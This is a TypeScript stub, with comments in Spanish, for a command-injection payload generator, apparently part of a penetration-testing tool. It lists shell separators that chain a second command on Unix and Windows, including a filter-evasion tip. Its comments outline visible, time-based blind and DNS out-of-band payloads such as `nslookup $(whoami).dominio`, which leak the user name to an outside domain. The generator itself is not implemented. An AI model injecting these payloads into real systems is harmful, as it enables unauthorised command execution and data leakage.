import { notImplemented } from '@/lib/todo'

export type CiOs = 'unix' | 'windows'
export type CiTechnique = 'visible' | 'time' | 'oob-dns'

/** Separadores que encadenan un segundo comando, con su semántica. */
export const SEPARATORS: Record<CiOs, { sep: string; desc: string }[]> = {
  unix: [
    { sep: ';', desc: 'Ejecuta el siguiente pase lo que pase.' },
    { sep: '&&', desc: 'Solo si el primero termina bien.' },
    { sep: '||', desc: 'Solo si el primero falla.' },
    { sep: '|', desc: 'Pipe: la salida del primero entra al segundo, que se ejecuta igual.' },
    { sep: '&', desc: 'Lanza el primero en segundo plano.' },
    { sep: '%0a', desc: 'Salto de línea URL-encoded: útil cuando filtran ; y &.' },
    { sep: '$(', desc: 'Sustitución de comandos (cerrar con ")").' },
    { sep: '`', desc: 'Sustitución de comandos con backticks (cerrar con `).' },
  ],
  windows: [
    { sep: '&', desc: 'Ejecuta el siguiente pase lo que pase (cmd.exe).' },
    { sep: '&&', desc: 'Solo si el primero termina bien.' },
    { sep: '||', desc: 'Solo si el primero falla.' },
    { sep: '|', desc: 'Pipe.' },
  ],
}

export interface CiOptions {
  /** Comando a inyectar en la técnica visible. Por defecto `id` o `whoami`. */
  command?: string
  /** Segundos de espera para la técnica ciega por tiempo. */
  delaySeconds?: number
  /** Dominio propio (Burp Collaborator, interactsh…) para la técnica OOB. */
  domain?: string
}

export interface CiPayload {
  payload: string
  separator: string
  /** Qué esperar en la respuesta para confirmar. */
  confirm: string
}

/**
 * Un payload por separador del SO.
 * - visible: `<sep> whoami`
 * - time: unix `sleep N`; windows `ping -n N+1 127.0.0.1` (el primer eco es inmediato)
 * - oob-dns: unix `nslookup $(whoami).dominio`; windows `nslookup %USERNAME%.dominio`
 */
export function generatePayloads(os: CiOs, technique: CiTechnique, opts: CiOptions = {}): CiPayload[] {
  return notImplemented('generatePayloads', os, technique, opts)
}
